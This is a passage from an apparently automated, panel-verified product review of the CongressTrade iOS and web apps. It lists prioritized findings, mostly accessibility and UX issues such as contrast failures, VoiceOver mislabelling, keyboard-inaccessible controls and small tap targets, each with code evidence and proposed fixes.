- **Fix:** Pin the pager row; show 'Updated h:mm' from the analytics asOf under Market Snapshot.
- **Evidence:** Only FeedControlBar + TradesUnifiedSearchField are outside the ScrollView; FeedPaginationBar is inside it.  No `asOf`/'Updated' text is rendered on Trends (FeedFreshnessView exists but only Directory uses it).
- **Panel:** ios-shipped-app — Pure improvement idea (P4); the cited structural facts (pinned block excludes FeedPaginationBar, no asOf stamp on Trends) are consistent with earlier confirmed findings (14, 15) but not independently re-checked line by line — low-risk P4 opportunity, kept as-is. · `ios-shipped-app/IOSSHIPPEDAPP-35`

#### 433. [P4] Latency scorecard ('Speed vs. Data Providers') lives at the bottom of the Delivery tab and the Trends link drops users at the top of that tab

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:77-94 (`tabRouter.selection = .delivery`); Views/Delivery/DeliveryView.swift:249-256 (section after Watchlist)  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** A marketing/analytics card is filed under a tab about webhooks, reached via a link that lands on unrelated content.
- **Impact:** Discoverability of a differentiator.
- **Fix:** Render LatencyComparisonView inline on Trends (or scroll to it via ScrollViewReader after the tab switch).
- **Evidence:** TrendsView.swift:79-80 button 'Filing latency comparison' just switches tabs; DeliveryView places LatencyComparisonView as the last section; no scroll anchor.  Both are gated by `LatencyScorecardCopy.isPubliclyVisible` (hidden in the captures).
- **Panel:** ios-shipped-app — TrendsView.swift confirmed the 'Filing latency comparison' row (~line 80-83) does nothing but `tabRouter.selection = .delivery`, and DeliveryView.swift places the corresponding LatencyComparisonView late in its section order (~line 249+), consistent with the claim that it's buried. · `ios-shipped-app/IOSSHIPPEDAPP-53`

#### 456. [P4] First-run has no onboarding or value-led sign-in prompt; the only intro is a 4-second auto-expanding disclaimer

- **Where:** Cold start / Trends tab  ·  **Surface:** iOS  ·  **Category:** growth  ·  **Effort:** M  ·  **Verdict:** plausible (medium confidence)
- **What:** Nothing explains Premium alerts, push, or why to sign in; the only first-run motion is a legal banner that collapses itself (and ignores reduce-motion by default absent explicit handling).
- **Impact:** Missed activation moment for alerts/Premium; the auto-collapsing banner can be missed or feel glitchy.
- **Fix:** A one-screen welcome (3 value bullets + Sign in with Apple + "Continue without account"), shown once; keep the disclaimer static (no timed collapse) and respect `accessibilityReduceMotion`.
- **Evidence:** TrendsView.swift confirmed `@AppStorage("ct_disclaimer_expanded") private var disclaimerExpanded = true` default-true pattern near the cited region; NOTES §5 independently states "Sign-in prompt: none appears spontaneously"; light/01-launch.png as cited.
- **Panel:** ios-hig-ux — Confirmed no onboarding flow exists anywhere in the app (no dedicated onboarding view file); did not independently verify the exact 4-second sleep duration or the reduceMotion-ignoring claim, but nothing contradicts either. · `ios-hig-ux/IOSHIGUX-34`

#### 462. [P4] No iOS platform surfaces: Home Screen widget, Spotlight/App Intents, Share extension

- **Where:** App target  ·  **Surface:** iOS  ·  **Category:** growth  ·  **Effort:** L  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** still-open-since-2026-08-06 (docs/reviews/2026-08-06-full-product-review.md iOS backlog #1048)
- **What:** A "latest disclosures" widget and Siri/Spotlight shortcuts ("Show Pelosi trades") are the native ways this content earns a place on the Home Screen.
- **Impact:** Re-engagement opportunity left on the table; the app is a browser-equivalent today.
- **Fix:** Add a small/medium WidgetKit widget backed by /api/client/v1/feed (cached) and App Intents for open-ticker/open-politician.
- **Evidence:** `find clients/ios -iname "*Widget*" -o -iname "*Intent*"` confirmed zero results -- no widget/intents/extension targets anywhere in the repo. Corrected citation: IMPROVEMENT-PLAN.md (confirmed dated 2026-07-13, matching the finding) does NOT itself mention widgets anywhere (grep -i widget on that file returns zero hits); the widgets reference actually lives in docs/reviews/2026-08-06-full-product-review.md lines 76-77 ("comprehensive iOS backlog (#1048 universal links / ShareLink / Sign in with Apple / magic link / widgets...)"), which is exactly what the finding's own status_vs_prior field already cites.
- **Panel:** ios-hig-ux — The core claim (no widget/App Intents/extension code exists) is independently confirmed by find/grep.  The evidence field's specific citation ('IMPROVEMENT-PLAN.md P1 lists widgets') was a misattribution -- that file never mentions widgets; the actual widgets reference is in the 2026-08-06 review doc via issue #1048, which the status_vs_prior field already correctly points to.  Corrected the evidence field above; did not change severity or verdict since the underlying fact (widgets are absent, and are a known tracked gap) is sound. · `ios-hig-ux/IOSHIGUX-35`

### Accessibility on web and iOS (57)

Both clients fail the basics on their most important surfaces: the money path is mouse-only on web, table semantics are destroyed by role=button, and iOS announces controls 2-4 times with sub-44pt targets and semantic colours that fail contrast.

#### 34. [P1] Premium plan selection (Monthly/Annual) is mouse-only: click-handler divs with no role, name, state or keyboard access

- **Where:** app/src/ui/dashboardHtml.ts:3462,3466 (markup), 11821-11827 (selectPlan)  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md W10)
- **What:** Keyboard and screen-reader users cannot choose the annual plan; the selected plan is conveyed only by border/tint colour (1.4.1) and never announced (4.1.2, 2.1.1).
- **Impact:** Money path: keyboard/AT users can only ever buy Monthly ($5) and do not know which plan will be charged when they press Start Free Trial.
- **Fix:** Render the plans as a radiogroup (<fieldset><legend>Plan</legend> + two <label><input type=radio name=plan>>) or <button aria-pressed>; style :checked; announce the selection.
- **Evidence:** dashboardHtml.ts@origin/main:3462 `<div class="plan sel" id="planMonthly" onclick="selectPlan('monthly')">`, :3466 `<div class="plan" id="planAnnual" onclick="selectPlan('annual')">`; :1365 `.plan:hover, .plan.sel { border-color:var(--accent); background:color-mix(in srgb,var(--accent) 7%,transparent); }`; :11821-11827 selectPlan() only toggles class 'sel'.  desktop/pricing-a11y.txt:87-93 `StaticText "Monthly" "$5" "/mo" "SAVE ~17%" "Annual" "$50" "/yr"` — no button/radio nodes.  Prior: docs/reviews/2026-07-28-full-app-review.md:58 W10 'pricing plan cards are click-only divs on the money path'.
- **Panel:** web-a11y — Code unchanged on origin/main; prior review W10 quoted at docs/reviews/2026-07-28-full-app-review.md:58; a11y tree shows plans as static text. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-06 · `web-a11y/WEBA11Y-03`

#### 45. [P1] Semantic green/red/orange text fails contrast in light mode (green 1.99:1)

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:202-203  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'sufficient contrast', line 97)
- **What:** System `.green` (#34C759) is used as text colour on light grey cards throughout Trends and the detail sheets; it fails WCAG AA at any size (needs 3:1 large / 4.5:1 normal), and system red/orange fail for the 11-15pt captions they colour.  These are the product's headline numbers (net flow, buy/sell counts, excess return, lead/lag).
- **Impact:** Low-vision and colour-deficient users, and anyone outdoors, cannot read the app's headline metrics in the default (light) appearance.
- **Fix:** Add asset-catalog semantic colours with darker light variants (green ≈ #1B7F3B, red ≈ #C0272D, orange ≈ #B25E00; keep dark variants) and use them wherever `.green`/`.red`/`.orange` colour text; or keep only the sign/arrow coloured and print the number in `.primary`.  Verify with Xcode's Accessibility Inspector colour-contrast calculator.
- **Evidence:** Verifier re-measured light/20-trends-top-loaded.png with PIL: dominant green (52,199,89) on card (242,242,247) = 1.99:1 (2.22:1 on white); red (255,56,60) = 3.20:1; system orange ≈2.1:1; secondary grey 3.29:1.  Code quoted: TrendsView.swift:198-199 `TrendKPI(title: "Buys", …, tint: .green)` / `tint: .red`; :870-873 `static func tint … return value > 0 ? .green : .red`; :481,:520,:602 `.foregroundStyle(SignedFlowFormat.tint(…))`; :1213 `.foregroundStyle(leadColor(snap.direction))`; :379-385 `+X%` `.foregroundStyle(.green)` on `Color.green.opacity(0.15)`; :741 `.orange : .green`; :772-774 `"\(…)d avg"` `.foregroundStyle(.orange)`; TrendKPI :1051-1053 prints the value in `tint`.  dark/04-trends-dark.png passes.
- **Panel:** ios-a11y — Pixel measurement reproduced (1.99:1 green, 3.20:1 red); all cited lines quoted verbatim.  Severity kept at P1: the failing colours carry the primary data on the launch tab. · `ios-a11y/IOSA11Y-01`

#### 46. [P1] Trades search slot: container accessibilityLabel makes Reload button read 'Request failed' and hides the trade count

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:1041-1067 (struct at 1032)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A label on a non-element container is inherited by each child element.  In the error state VoiceOver announces the Reload button as 'Request failed, button' (no cue that it retries); in the normal state the magnifier icon and the count '2,178' both announce the search-field label, so the result count is inaudible and the field label is heard three times.
- **Impact:** Blind users cannot discover the recovery action after a failed load and never hear how many trades match; every Trades visit starts with triplicated announcements.
- **Fix:** Remove the container label; label the `TextField` directly (`.accessibilityLabel("Search trades")`), give the Reload button `.accessibilityLabel("Reload trades")` + `.accessibilityHint(message)`, mark the magnifier `.accessibilityHidden(true)`, and label the count `"\(count) trades"`.
- **Evidence:** FeedDashboardView.swift:1053-1082 — outer `HStack` holds `Group { statusSlot | searchSlot }` and `Text(countLabel)` and ends with `.accessibilityLabel(status == nil ? "Search trades by politician name, ticker, state, or party" : statusAccessibility)`; no `.accessibilityElement(children:)`.  :1124-1135 reload slot: `Text(message)` + `Button("Reload", action: onReload)` with no own label (only the Clear button at :1106 has one).  Capture NOTES §6.3: 'the "Request failed" text on Trades' banner is also the accessibility label of its Reload button'.
- **Panel:** ios-a11y — Code quoted; capture-agent hierarchy note corroborates the 'Request failed' button label.  Kept P1 because the mislabelled control is the only recovery path on the Trades tab. · merged: ios-shipped-app/IOSSHIPPEDAPP-38 · `ios-a11y/IOSA11Y-02`

#### 47. [P1] Mobile trade cards' aria-label hides Buy/Sell, amount and date from screen readers

- **Where:** app/src/ui/dashboardHtml.ts:4431  ·  **Surface:** Web · mobile  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** aria-label replaces the card's content in the accessible name, so the visible Buy/Sell pill, amount bracket, trade date, chamber, party and lag are not conveyed, and the visible text is not part of the name (WCAG 2.5.3, 1.3.1, 4.1.2).
- **Impact:** VoiceOver/TalkBack users on phones hear only ticker + politician for every card and cannot tell buys from sells or the size of the trade without opening each card.
- **Fix:** Drop aria-label; let the card text be the name (or aria-labelledby the inner elements) and put 'Open trade details' in aria-describedby / a visually-hidden suffix.
- **Evidence:** dashboardHtml.ts@origin/main:4431 `'<article class="trades-card clickable" tabindex="0" role="button" data-txid="…" title="Open trade details" aria-label="Open trade details for ' + esc((r.ticker || r.asset) + ' by ' + member) + '">'`; :4433 the card body renders `assetCellHtml(r) + actionBadge(r.type)` + amount + date, all masked by the aria-label.  mobile/trades-a11y.txt:47-49 `button "Open trade details for VSNT by Kevin Hern"` (no Sell/Buy, no $1k–$15k, no date).  lighthouse/SUMMARY.txt trades-mobile `label-content-name-mismatch` items=52 incl. `article.trades-card`.
- **Panel:** web-a11y — Code and a11y tree reproduce exactly; the card DOM does contain Buy/Sell (actionBadge) and party text, so the fix is purely removing the overriding aria-label. · `web-a11y/WEBA11Y-02`

#### 56. [P1] Trades table rows and sortable headers are re-roled to button, destroying table semantics for screen readers

- **Where:** app/src/ui/dashboardHtml.ts:4811 (tr), 2930-2934 (th sortable), 4604 (sortAttrs), 12650 (ENTITY_FOCUSABLE_SELECTOR)  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** role=button overrides the native row role on <tr> and columnheader on <th>, so assistive tech no longer exposes the Trades feed as a table: no column-header association, no cell navigation, each row is one long run-on string with duplicated avatar initials, and aria-sort is invalid on role=button so sort state is lost.  WCAG 1.3.1, 4.1.2.
- **Impact:** Screen-reader users on the core Trades view cannot navigate by column or tell which value belongs to which column, and sort direction is not programmatically exposed.
- **Fix:** Keep <tr>/<th> native roles: exclude TR/TH/TD from makeEntityTargetsFocusable (keep tabindex=0 + Enter/Space), expose the row action via a visually-hidden <button>Open trade details</button> in the first cell or aria-describedby; for headers put a <button> inside the <th> and keep aria-sort on the <th>.
- **Evidence:** dashboardHtml.ts@origin/main:4811 `return '<tr class="row clickable" data-txid="' + esc(r.id) + '" title="Open trade details">'`; :12650 `ENTITY_FOCUSABLE_SELECTOR = '.clickable[data-member], .clickable[data-asset], .clickable[data-ticker], .clickable[data-txid]'` and :12658 `if (!n.hasAttribute('role')) n.setAttribute('role', 'button');` (applied to the <tr>); :4604 `var sortAttrs = c.sort ? ' tabindex="0" role="button" aria-sort="none"' : '';` on <th>; :2930 `<th class="sortable" … tabindex="0" role="button" onclick="setTickerSort('trades')"`.  desktop/trades-a11y.txt:44-51 `button "DATE ▼"`, `button "TYPE ↕"` … `button "8-5-26 Sell KH Kevin Hern Kevin Hern | OK VSNT Versant Media Group Inc. Class A $1k - $15k US"` — no table/row/columnheader nodes.  lighthouse/SUMMARY.txt trades-desktop `aria-allowed-attr` items=6 `th.sortable :: ARIA attribute is not allowed: aria-sort="descending"`.  Live JS on congress.trade confirmed tr role=button, th role=button aria-sort=descending.
- **Panel:** web-a11y — All four code citations quoted verbatim from origin/main; a11y tree and Lighthouse aria-allowed-attr reproduce; live DOM check confirmed role=button on tr and th. · `web-a11y/WEBA11Y-01`

#### 104. [P2] Filter chip labels announced 2-4 times each (label applied to chip children)

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:998-1023 (FilterMenuLabel), 946-991 (SidesFilterMenuLabel)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** new
- **What:** Each chip contains 2-4 images/texts; without `.accessibilityElement(children: .ignore)` the label is duplicated per child, so VoiceOver users swipe through 12+ identical announcements to cross the strip, and nothing says these open menus.
- **Impact:** Filter strip is tedious and confusing for VoiceOver users on both primary tabs.
- **Fix:** In `FilterMenuLabel`/`SidesFilterMenuLabel` add `.accessibilityElement(children: .ignore)` (or `.combine`) before `.accessibilityLabel`, add `.accessibilityAddTraits(.isButton)` and `.accessibilityHint("Opens filter menu")`; or move the label onto the `Menu` itself.
- **Evidence:** FeedDashboardView.swift:1019-1035 `FilterMenuLabel`: `ControlChip(…) { HStack { Image(icon); if showsLabel { Text(title) }; Image("chevron.down") } }.accessibilityLabel(accessibilityLabel ?? title)`; :971-1002 `SidesFilterMenuLabel` (three arrow images + optional text + chevron) `.accessibilityLabel("Trade side filter, \(title)")`; `ControlChip` :699-710 is `content().padding…background…` with no `.accessibilityElement`.  Capture NOTES §6.4: 'Time range, Past 3 Months, Time range, Past 3 Months, Time range, Past 3 Months'; 'Trade side filter, All' ×4.
- **Panel:** ios-a11y — Code quoted and capture hierarchy notes match the predicted duplication count. · merged: ios-hig-ux/IOSHIGUX-13, ios-engineering/IOSENGINEERING-22 · `ios-a11y/IOSA11Y-03`

#### 105. [P2] Buys vs Sells chart conveys buy/sell only by green vs red — no legend, no per-segment numbers

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:232-268  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'non-color status cues', line 97)
- **What:** Sighted colour-deficient users (≈8% of men) cannot tell which segment is buys and which is sells, and nobody can read the split without VoiceOver.
- **Impact:** The chart's only message (buy vs sell mix per period) is unreadable for colour-blind users.
- **Fix:** Add a small legend ('■ Buys ■ Sells') and print buys/sells on each row or on tap; when `\.accessibilityDifferentiateWithoutColor` is on, add a hatch/outline to one series; or use Swift Charts `BarMark` with `.foregroundStyle(by:)` which supplies a legend and audio graph.
- **Evidence:** TrendsView.swift:229-264 rows draw `RoundedRectangle(cornerRadius: 3).fill(Color.green.opacity(0.75))` and `.fill(Color.red.opacity(0.75))` side by side; only the row total is printed (`Text(useDollars ? CompactFormat.usd(buyVal + sellVal) : CompactFormat.count(…))` :251-253); no legend anywhere in `volumeSection` (:204-269); grep for `accessibilityDifferentiateWithoutColor` = 0.  Screenshots a11y-xxxl/03-trends-xxxl-scrolled.png, light/21-trends-scroll-02.png show unlabelled green+red bars.  (Row a11y label at :261-263 does spell out both numbers for VoiceOver.)
- **Panel:** ios-a11y — Code quoted; no legend text exists in the section. · `ios-a11y/IOSA11Y-05`

#### 106. [P2] Filter/sort/pager chips are ~28-30pt tall (below the 44pt minimum tap target); header buttons capped at 34pt

- **Where:** clients/ios/CongressTrade/Views/Components/Components.swift:778-798 (HeaderIconButton); Views/Feed/FeedDashboardView.swift:681-699 (ControlChip); Views/Components/Components.swift:214-232 (FilterChip)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Apple HIG requires ≥44×44pt hit regions; the app's whole control language (chips) sits at ~29pt with compact chevron chips ≈30×28pt.
- **Impact:** Users with tremor or large fingers mis-tap paging/sort/filter controls; Switch Control / AssistiveTouch users too.
- **Fix:** Keep the visual pill but add `.frame(minHeight: 44)` + `.contentShape(Rectangle())` on the Button/Menu (or `.padding(.vertical, 6)` outside the chip inside a 44pt frame); give compact chevron chips `minWidth: 44`; raise `HeaderIconButton` min frame to 44.
- **Evidence:** Verifier column scan of light/10-trades-tab.png (3px/pt): 'Past 3 Months' chip spans y=379-467 = 88px ≈ 29pt.  Code: FeedDashboardView.swift:699-710 `ControlChip` = `.padding(.horizontal, compact ? 10 : 12).padding(.vertical, 8)` around `.caption` glyphs; :854-880 pager `Button(action: onPrevious) { ControlChip(compact: true) { Image("chevron.left").font(.caption.weight(.bold)) } }.buttonStyle(.plain)` with no min frame; :740-748 sort chip likewise; Components.swift:727-751 `HeaderIconButton` comment 'a tap target smaller than the default ~44pt toolbar hit area' with `.frame(minWidth: 34, minHeight: 34)`.
- **Panel:** ios-a11y — Chip height reproduced from pixels (88px/3 = 29pt); HeaderIconButton comment explicitly documents the sub-44pt target. · merged: ios-hig-ux/IOSHIGUX-15 · `ios-a11y/IOSA11Y-06`

#### 107. [P2] Party shown only as an emoji in Trade Details; chamber only as a background tint

- **Where:** clients/ios/CongressTrade/Views/Feed/TradeDetailView.swift:144-149 (politicianValue), 421-426 (chamberGradient)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Party and chamber are encoded as an emoji and a pastel gradient; screen-reader users hear an animal name and never learn the chamber, and the mascot mapping is not obvious to non-US users.
- **Impact:** Meaning lost for VoiceOver users and anyone unfamiliar with the mascot convention.
- **Fix:** Print party/chamber/state as text ('Rep.  Kevin Hern (R-OK, House)') in the Politician row and give the row an explicit accessibility label without the emoji; keep the emoji purely decorative or drop it.
- **Evidence:** Verifier viewed light/13-trade-detail-expanded.png: Politician row reads '🐘 Kevin Hern'; no chamber text anywhere on the sheet.  TradeDetailView.swift:147-151 `politicianValue` = `[trade.member.party?.partyEmoji ?? "", trade.member.name ?? "Unknown"]…joined(separator: " ")`; Components.swift:58-64 `partyEmoji` 🫏/🐘/🦅; TradeDetailView.swift:178 `.accessibilityLabel("\(label): \(value)")` → 'Politician: elephant Kevin Hern'; :421-427 `chamberGradient` (house/senate/exec colours) is the only chamber signal.
- **Panel:** ios-a11y — Screenshot and code both confirm; the row label interpolates the emoji into the spoken value. · merged: visual-design/VISUALDESIGN-14 · `ios-a11y/IOSA11Y-09`

#### 108. [P2] Delivery chamber FilterChips expose no selected state to VoiceOver

- **Where:** clients/ios/CongressTrade/Views/Delivery/DeliveryView.swift:116-119  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Selection is conveyed solely by fill colour; VoiceOver announces 'House, button' whether or not it is selected, and toggle-off is indistinguishable from toggle-on.
- **Impact:** Blind users cannot tell which chambers a delivery will filter to before creating it.
- **Fix:** Add `.accessibilityAddTraits(isSelected ? .isSelected : [])` (or `.accessibilityValue(isSelected ?  "Selected" : "Not selected")`) inside `FilterChip`, and a checkmark glyph as a non-colour cue.
- **Evidence:** Components.swift:172-191 `FilterChip`: `Button(action:) { Text(title)….foregroundStyle(isSelected ? .white : .primary).background(isSelected ? Color.accentColor : …) }.buttonStyle(.plain)` — no `.accessibilityAddTraits(.isSelected)`/`.accessibilityValue`; DeliveryView.swift:123-135 only adds `.accessibilityLabel(chamber.label)`.
- **Panel:** ios-a11y — Code quoted; not observable on device (Premium/signed-in only) but unambiguous from source. · `ios-a11y/IOSA11Y-10`

#### 129. [P2] Delivery create form: channel/branch selects have no accessible name and text inputs rely on placeholder/title only

- **Where:** app/src/ui/dashboardHtml.ts:3164-3170  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 1.3.1 / 3.3.2 / 4.1.2: the channel and branch selects have no accessible name; the URL/tickers/members inputs are named only by placeholder/title fallback, which disappears once typed and is not a visible label.
- **Impact:** Premium users with screen readers hear unnamed comboboxes for channel/branches and lose the field purpose once they type; the create-delivery flow is completable but error-prone with AT.
- **Fix:** Add visible <label for> (or at minimum aria-label) to every control: 'Channel', 'Target URL', 'Tickers', 'Members', 'Branches', 'Trade side', 'Minimum trade size'; keep placeholders as hints.
- **Evidence:** dashboardHtml.ts@origin/main:3164 `<select id="newDelivery" disabled onchange="updateNewTargetVisibility()">` (no label/aria-label), :3167 `<input id="newTarget" placeholder="target URL (webhook only)" …>`, :3168 `<input id="newTickers" placeholder="tickers (CSV, optional)" …>`, :3169 `<input id="newMembers" placeholder="members (names/ids, optional)" … title="Comma-separated filer ids or names" />`, :3170 `<select id="newChambers" disabled>`.  desktop/delivery-a11y.txt:35 `combobox disableable disabled … value="SSE"` (no name), :38 `textbox "tickers (CSV, optional)"` (placeholder as name), :39 `textbox "Comma-separated filer ids or names"` (title as name), :40 `combobox … value="House + Senate + Executive"` (no name).  logs/desktop-trends-console.txt:8 `[issue] No label associated with a form field (count: 7)`.
- **Panel:** web-a11y — All citations verified.  Downgraded to P2: Chrome exposes placeholder/title as fallback accessible names for the three inputs (a11y tree :38-39), so only the two selects are truly nameless and the values ('SSE', 'House + Senate + Executive') give partial context; still a clear 3.3.2/4.1.2 failure. · `web-a11y/WEBA11Y-04`

#### 130. [P2] Directory column-sort headers are not keyboard operable (onclick on <th> only)

- **Where:** app/src/ui/dashboardHtml.ts:3078-3080  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 2.1.1 Keyboard: sorting the 381-row directory is mouse-only; sort state (▼) is a text glyph with no aria-sort.
- **Impact:** Keyboard-only and switch users cannot re-sort the Directory by name/branch/trades.
- **Fix:** Wrap header text in a <button> (or reuse the Trades header keydown pattern) with Enter/Space handling and aria-sort on the <th>.
- **Evidence:** dashboardHtml.ts@origin/main:3078 `<th class="col-fill" data-sort="name" onclick="sortPeopleDirectory('name')" title="Sort by name">Politician <span class="sort-ind"></span></th>`, :3079-3080 same for chamber/trades — no tabindex, role, keydown or aria-sort; :3061 instructions say 'Click a column heading to sort'.  desktop/directory-a11y.txt:21-24 `StaticText "POLITICIAN"`, `StaticText "BRANCH • PARTY • STATE"`, `StaticText "TRADES "`, `StaticText "▼"` (not focusable).  Contrast: Trades headers get tabindex/keydown at :4604-4612.
- **Panel:** web-a11y — Code and a11y tree match; the same file demonstrates the keyboard pattern already exists for Trades headers. · merged: web-ux-desktop/WEBUXDESKTOP-33 · `web-a11y/WEBA11Y-05`

#### 131. [P2] Drawer (trade / member / ticker) is not a dialog: no role, aria-modal or accessible name, background not hidden

- **Where:** app/src/ui/dashboardHtml.ts:3421-3423  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 4.1.2 / 1.3.1: AT is not told a dialog opened or what it is; the virtual cursor can wander into the dimmed page; drill-in replaces content silently.
- **Impact:** Screen-reader users get no announcement of the drawer or its title, may read the background, and lose orientation on drill-in.
- **Fix:** Add role="dialog" aria-modal="true" aria-labelledby=<drawer h2 id> to .drawer-panel, set inert on <main>/<header> while open, and move focus to the h2 on each drill-in.
- **Evidence:** dashboardHtml.ts@origin/main:3421-3423 `<div class="drawer" id="detailDrawer"><div class="drawer-backdrop" onclick="closeDrawer()"></div><div class="drawer-panel"><div class="drawer-topbar"><span … id="drawerTopbarTitle" aria-hidden="true"></span><button class="drawer-close" onclick="closeDrawer()" aria-label="Close">✕</button></div>` — no role=dialog/aria-modal/aria-labelledby; :10823-10855 openDrawer() only sets class 'open' and calls trapFocusIn/focus.  Compare :3428 / :3448 modals `role="dialog" aria-modal="true"`.  desktop/trades-row-expanded-a11y.txt:129-131 drawer content appears as loose siblings (`button "Close" focusable focused`, `heading "$1k - $15k" level="2"`).  NOTES.md (a).
- **Panel:** web-a11y — Markup and openDrawer() quoted; the login/pricing modals show the intended pattern already exists in the file. · `web-a11y/WEBA11Y-07`

#### 132. [P2] 'Copy link to …' controls are href-less <a> elements: not focusable or operable by keyboard

- **Where:** app/src/ui/dashboardHtml.ts:10863  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 2.1.1, 4.1.2: the only share/permalink affordance in the drawer is invisible to keyboards and screen readers.
- **Impact:** Keyboard and AT users cannot obtain the permalink for a trade, member or ticker.
- **Fix:** Render as <button type="button" class="drawer-all-link"> (or <a href="?trade=…"> with the copy handler) and announce 'Copied' via the existing role=status toast.
- **Evidence:** dashboardHtml.ts@origin/main:10863-10864 `function copyLinkHtml(param, value, label) { return '<a class="drawer-all-link clickable" data-copy-param="…" data-copy-value="…">🔗 ' + esc(label) + '</a>'; }` (no href/tabindex; not matched by ENTITY_FOCUSABLE_SELECTOR :12650; only a click delegate at :10867).  desktop/trades-row-expanded-a11y.txt:179 `StaticText "🔗 Copy link to this trade"`; NOTES.md:103 'an <a> with no href'.
- **Panel:** web-a11y — Code, a11y tree and NOTES all agree; only a click handler exists (:10867). · merged: web-ux-desktop/WEBUXDESKTOP-39 · `web-a11y/WEBA11Y-08`

#### 133. [P2] Filter buttons: aria-label 'Filter by branch/party/trade type' overrides the visible value ('All', 'House', 'Buys'), so the current filter is neither in the name nor announced

- **Where:** app/src/ui/dashboardHtml.ts:2735,2871  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 2.5.3 Label in Name (visible text not in name), 4.1.2 (current filter value not exposed), plus aria-haspopup='true' promises a menu but the popup is a set of aria-pressed toggles with no arrow-key/Escape handling.
- **Impact:** Voice-control users saying 'click All' fail; screen-reader users cannot hear which branch/party/side filter is active without opening each popup; keyboard users cannot dismiss with Escape.
- **Fix:** Use aria-labelledby (static label span + value span) or aria-label='Filter by branch: ' + summary; drop aria-haspopup="true" (or use 'dialog'); close on Escape and return focus.
- **Evidence:** dashboardHtml.ts@origin/main:2735 `<button type="button" class="ios-filter-btn" aria-haspopup="true" aria-expanded="false" aria-label="Filter by branch">` + `<span class="ios-filter-lbl" data-ios-summary>All</span>`; a11y trees show `button "Filter by branch"` regardless of selection.  lighthouse/SUMMARY.txt `label-content-name-mismatch` fails on all four runs (14/14/2/52 items) citing `div#trChamber > button.ios-filter-btn`.  Escape handler :12675 `closePanels(); closeDrawer(); closeLogin(); closePricing();` does not call closeIosFilterMenus (:12325); menus close only on click (:12424/:12433).  Popup items are aria-pressed toggle buttons (:2741-2767).
- **Panel:** web-a11y — Core claim confirmed.  Removed the incorrect :1488 'active state by colour' evidence — that rule is `.ios-filter.has-sel .ios-filter-btn { background: var(--panel-2); color: var(--text); … }` (keeps default chrome; the visible label changes instead), so the visible state is fine; the programmatic name/state gap remains. · `web-a11y/WEBA11Y-09`

#### 134. [P2] Dark theme: white text on accent/buy/sell/exchange fills fails 4.5:1 (primary buttons, Buy/Sell pills, active filter items)

- **Where:** app/src/ui/dashboardHtml.ts:159-162-equivalent block (now ~155-163)  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 1.4.3 Contrast (Minimum) fails throughout dark mode for the primary CTAs and the Buy/Sell/Exchange type indicator.
- **Impact:** Low-vision users in dark mode struggle to read the primary CTAs and cannot reliably read Buy vs Sell pills (2.3:1 for Buy).
- **Fix:** In dark theme use dark text on the bright fills (e.g. #08111f on --buy/--exch/--accent) or darken the fills (accent ~#2f6fe0, buy #15803d, sell #dc2626 with white text); verify ≥4.5:1; keep light values.
